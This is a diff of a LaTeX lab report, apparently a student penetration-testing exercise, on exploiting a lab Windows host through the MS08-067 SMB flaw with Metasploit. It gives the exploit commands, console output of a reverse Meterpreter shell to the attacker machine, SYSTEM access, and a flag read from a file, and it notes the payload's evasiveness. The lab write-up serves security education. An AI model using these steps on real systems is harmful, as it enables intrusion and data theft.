@@ -101,7 +101,9 @@ Nmap done: 1 IP address (1 host up) scanned in 62.19 seconds
            Raw packets sent: 8094 (359.682KB) | Rcvd: 8093 (326.558KB)
 
 \end{lstlisting}
-We found that in port 445 it runs Windows 2003 or 2008 microsoft-ds service, which could exist a flaw. So we searched the Metasploit database and found an exploit called \lstinline{ms08_067_netapi}. It exploits a parsing flaw through the service. We type the following command in the metasploit console:
+We found that in port 445 it runs Windows 2003 or 2008 microsoft-ds service, which could exist a flaw. So we searched the Metasploit database and found an exploit called \lstinline{ms08_067_netapi}. It exploits a parsing flaw through the service.  To put it in a detail, in CPU, there is a secure technique called NX bit. It will divide memory into either the storage of data or the storage of processor instructions. The exploit bypasses NX by return to a function call inside a dll file which can disable NX\cite{NXBit}. As a consequence, the evil code will not be prevented and can be executed in the memory.
+To make dll injection attack, we need to use meterpreter as our payload. It resides completely in the memory of the remote host and leaves no traces on the hard drive. Thus it becomes very difficult to detect.\cite{payload_meterpreter}
+Here are the steps:
 \begin{itemize}
 	\item \lstinline{use exploit/windows/smb/ms08_067_netapi} 
 	\item set RHOST 192.168.233.20
@@ -117,5 +119,6 @@ We found that in port 445 it runs Windows 2003 or 2008 microsoft-ds service, whi
 [*] Sending stage (752128 bytes) to 192.168.233.20
 [*] Meterpreter session 2 opened (10.11.12.29:4444 -> 192.168.233.20:1069) at 2014-03-05 00:57:55 +0100
 	\end{lstlisting}
-	We now get the root access of the machine.By typing \textit{getuid} it shows \lstinline{NT AUTHORITY\SYSTEM}. And we can type other commands to browse the file or view its content. We use \textit{search -f secret.txt} command and found that there do have a file called secret.txt. We opened it, which showed the code:c5zmfVpkSJrFA.
+	We now get the root access of the machine. By typing \textit{getuid} it shows \lstinline{NT AUTHORITY\SYSTEM}. And we can type other commands to browse the file or view its content. We use \textit{search -f secret.txt} command and found that there do have a file called secret.txt. We opened it, which showed the code: c5zmfVpkSJrFA.
+	
 \end{itemize}
